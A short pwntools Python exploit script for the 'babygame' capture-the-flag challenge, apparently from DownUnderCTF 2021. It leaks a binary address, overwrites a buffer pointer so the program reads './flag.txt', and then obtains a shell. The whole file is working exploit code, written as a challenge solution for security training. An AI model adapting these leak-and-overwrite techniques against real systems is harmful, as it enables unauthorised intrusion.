#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./babygame')

if args.REMOTE:
	p = remote('pwn-2021.duc.tf', 31907)
else:
	p = process(binary.path)

# send 32 byte name to leak address of binary
p.sendafter(b'?\n',32 * b'A')

# get binary address
p.sendlineafter(b'> ',b'2')
p.recv(32)
binary.address = u64(p.recv(6) + b'\0\0') - binary.search(b'/dev/urandom').__next__()
log.info('binary.address: ' + hex(binary.address))

# point RANDBUF to NAME; set NAME to ./flag.txt; we know flag starts with DUCT
p.sendlineafter(b'> ',b'1')

payload  = b''
payload += b'./flag.txt\0'
payload += (32 - len(payload)) * b'A'
payload += p64(binary.sym.NAME)[:6]

p.sendafter(b'?\n',payload)

# get shell
p.sendlineafter(b'> ',b'1337')
p.sendlineafter(b'guess: ',str(u32(b'DUCT')).encode())
p.interactive()

